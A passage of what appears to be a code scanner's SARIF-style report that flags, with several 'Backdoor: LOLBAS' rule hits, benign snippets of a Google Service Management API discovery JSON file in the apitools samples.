                    "text": "          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n",
                    "rendered": {
                      "text": "          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n",
                      "markdown": "`          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 205,
                  "endLine": 164,
                  "endColumn": 209,
                  "snippet": {
                    "text": "          \"$ref\": \"Service\"\n        },\n        \"configSource\": {\n          \"description\": \"User-supplied source configuration for the service. This is distinct from\\nthe generated configuration provided in `google.api.Service`.\\nThis is NOT populated on GetService calls at the moment.\\nNOTE: Any upsert operation that contains both a service_config\\nand a config_source is considered invalid and will result in\\nan error being returned.\",\n          \"$ref\": \"ConfigSource\"\n        },\n        \"operations\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"Service\"\n        },\n        \"configSource\": {\n          \"description\": \"User-supplied source configuration for the service. This is distinct from\\nthe generated configuration provided in `google.api.Service`.\\nThis is NOT populated on GetService calls at the moment.\\nNOTE: Any upsert operation that contains both a service_config\\nand a config_source is considered invalid and will result in\\nan error being returned.\",\n          \"$ref\": \"ConfigSource\"\n        },\n        \"operations\": {\n",
                      "markdown": "`          \"$ref\": \"Service\"\n        },\n        \"configSource\": {\n          \"description\": \"User-supplied source configuration for the service. This is distinct from\\nthe generated configuration provided in `google.api.Service`.\\nThis is NOT populated on GetService calls at the moment.\\nNOTE: Any upsert operation that contains both a service_config\\nand a config_source is considered invalid and will result in\\nan error being returned.\",\n          \"$ref\": \"ConfigSource\"\n        },\n        \"operations\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 169,
                  "endLine": 143,
                  "endColumn": 178,
                  "snippet": {
                    "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3217,
                  "startColumn": 43,
                  "endLine": 3217,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3123,
                  "startColumn": 43,
                  "endLine": 3123,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3077,
                  "startColumn": 37,
                  "endLine": 3077,
                  "endColumn": 46,
                  "snippet": {
                    "text": "is method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The service to query access for.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n                },\n                \"userEmail\": {\n                  \"description\": \"The user to query access for.\",\n                  \"location\": \"query\",\n             ",
                    "rendered": {
                      "text": "is method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The service to query access for.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n                },\n                \"userEmail\": {\n                  \"description\": \"The user to query access for.\",\n                  \"location\": \"query\",\n             ",
                      "markdown": "`is method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The service to query access for.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n                },\n                \"userEmail\": {\n                  \"description\": \"The user to query access for.\",\n                  \"location\": \"query\",\n             `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3074,
                  "startColumn": 68,
                  "endLine": 3074,
                  "endColumn": 77,
                  "snippet": {
                    "text": "\": \"servicemanagement.services.accessPolicy.query\",\n              \"path\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"flatPath\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Method to query the accessibility of a service and any associated\\nvisibility labels for a specified user.\\n\\nMembers of the producer project may call this method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe servi",
                    "rendered": {
                      "text": "\": \"servicemanagement.services.accessPolicy.query\",\n              \"path\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"flatPath\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Method to query the accessibility of a service and any associated\\nvisibility labels for a specified user.\\n\\nMembers of the producer project may call this method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe servi",
                      "markdown": "`\": \"servicemanagement.services.accessPolicy.query\",\n              \"path\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"flatPath\": \"v1/services/{serviceName}/accessPolicy:query\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Method to query the accessibility of a service and any associated\\nvisibility labels for a specified user.\\n\\nMembers of the producer project may call this method and specify any user.\\n\\nAny user may call this method, but must specify their own email address.\\nIn this case the method will return NOT_FOUND if the user has no access to\\nthe servi`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3042,
                  "startColumn": 290,
                  "endLine": 3042,
                  "endColumn": 299,
                  "snippet": {
                    "text": ": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.google",
                    "rendered": {
                      "text": ": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.google",
                      "markdown": "`: \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.google`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3042,
                  "startColumn": 252,
                  "endLine": 3042,
                  "endColumn": 261,
                  "snippet": {
                    "text": "gs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequi",
                    "rendered": {
                      "text": "gs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequi",
                      "markdown": "`gs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequi`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3042,
                  "startColumn": 82,
                  "endLine": 3042,
                  "endColumn": 91,
                  "snippet": {
                    "text": " \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n    ",
                    "rendered": {
                      "text": " \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n    ",
                      "markdown": "` \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<response: SubmitConfigSourceResponse>\\n\",\n    `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3042,
                  "startColumn": 43,
                  "endLine": 3042,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        \"submit\": {\n              \"id\": \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<respons",
                    "rendered": {
                      "text": "        \"submit\": {\n              \"id\": \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<respons",
                      "markdown": "`        \"submit\": {\n              \"id\": \"servicemanagement.services.configs.submit\",\n              \"path\": \"v1/services/{serviceName}/configs:submit\",\n              \"flatPath\": \"v1/services/{serviceName}/configs:submit\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service based on\\nuser-supplied configuration sources files (for example: OpenAPI\\nSpecification). This method stores the source configurations as well as the\\ngenerated service config. It does NOT apply the service config to any\\nbackend services.\\n\\nOperation<respons`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3014,
                  "startColumn": 159,
                  "endLine": 3014,
                  "endColumn": 168,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3014,
                  "startColumn": 120,
                  "endLine": 3014,
                  "endColumn": 129,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3014,
                  "startColumn": 43,
                  "endLine": 3014,
                  "endColumn": 52,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Creates a new service config (version) for a managed service. This method\\nonly stores the service config, but does not apply the service config to\\nany backend services.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2991,
                  "startColumn": 47,
                  "endLine": 2991,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"configId\": {\n                  \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"configId\": {\n                  \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"configId\": {\n                  \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2982,
                  "startColumn": 129,
                  "endLine": 2982,
                  "endColumn": 138,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2982,
                  "startColumn": 36,
                  "endLine": 2982,
                  "endColumn": 45,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
